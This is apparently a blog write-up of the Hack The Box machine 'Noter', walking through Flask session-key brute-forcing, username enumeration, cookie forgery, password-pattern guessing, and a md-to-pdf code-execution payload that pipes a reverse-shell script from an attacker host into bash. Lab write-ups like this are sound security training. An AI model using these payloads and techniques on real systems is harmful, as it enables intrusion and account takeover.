---
title: "HTB - Noter"
date: 2023-03-11T18:37:15+01:00
draft: false
tags: [HTB, Medium, Windows]
---

## Foothold
### Nmap
```  
PORT STATE SERVICE VERSION  
21/tcp open ftp vsftpd 3.0.3  
22/tcp open ssh OpenSSH 8.2p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)  
5000/tcp open http Werkzeug httpd 2.0.2 (Python 3.8.10)  
```
Classic linux box with unauthorized anonymous login on ftp and a Flask webapp on port 5000.

Website is a note taking service. We can create an account and login using */login* and */register*.

Cookie is a JWT. And since this is Flask we can use [this tool]([https://book.hacktricks.xyz/network-services-pentesting/pentesting-web/flask](https://book.hacktricks.xyz/network-services-pentesting/pentesting-web/flask)) in order to bruteforce the signing key. This will allow us to craft our own cookies.
> Don't forget to have your machine time synced with the machine
> Thx hAAAAAAAAAAAAAAAAtricks

```
> ../.local/bin/flask-unsign -u -c < cookie.txt

[*] Session decodes to: {'logged_in': True, 'username': 'azer'}
[*] No wordlist selected, falling back to default wordlist..
[*] Starting brute-forcer with 8 threads..
[+] Found secret key after 18304 attemptscXqPyDHaOR4K
'secret123'
```

When we try to login, we can see that there is two different message that pops up depending whether or not we're trying to login with an existing user. 

Since ffuf doesn't work, let's use a custom made python script    
```  
...  
Trying: blowfish  
Trying: bls  
Trying: blue  
Found valid username: blue  
```

Let's craft a cookie that will hold the *username* property as *blue* :
```
> ../.local/bin/flask-unsign -s -c "{'logged_in': True, 'username': 'blue'}" --
secret secret123

eyJsb2dnZWRfaW4iOnRydWUsInVzZXJuYW1lIjoiYmx1ZSJ9.Yw-1Yg.roc8aqCf9Cn3ePy2b91EjAyHaTw
```

We can successfully impersonate user *blue* inside the note web application.

## User
Browsing the notes available to read as *blue* we find this one :
```
Hello, Thank you for choosing our premium service. Now you are capable of  
doing many more things with our application. All the information you are going  
to need are on the Email we sent you. By the way, now you can access our FTP  
service as well. Your username is 'blue' and the password is 'blue@Noter!'.  
Make sure to remember them and delete this.  
(Additional information are included in the attachments we sent along the  
Email)  
  
We all hope you enjoy our service. Thanks!  
  
ftp_admin
```

Trying to login as user *blue*  with password *blue@Noter!* we can access a pdf file on the ftp server that tells us that every passwords is formatted the same way:
*{username}@Noter!* . We can use this to guess the password of *ftp_admin* !

We retrieve two backup files containing the code of the web app.

*md-to-pdf* is vulnerable in the */export_from_cloud* route. We can serve a malicious .md file containing `---js\n((require("child_process")).execSync("curl http://10.10.14.174/rev_shel.sh | bash"))\n---RCE` 

We get an access AND the user flag !

## LPE

Using *linpeas* we can see that the mysql server is ran by root.

We can use [this tutorial](https://medium.com/r3d-buck3t/privilege-escalation-with-mysql-user-defined-functions-996ef7d5ceaf) in order to get the root flag !

AAAAAAAAAAAAAAAA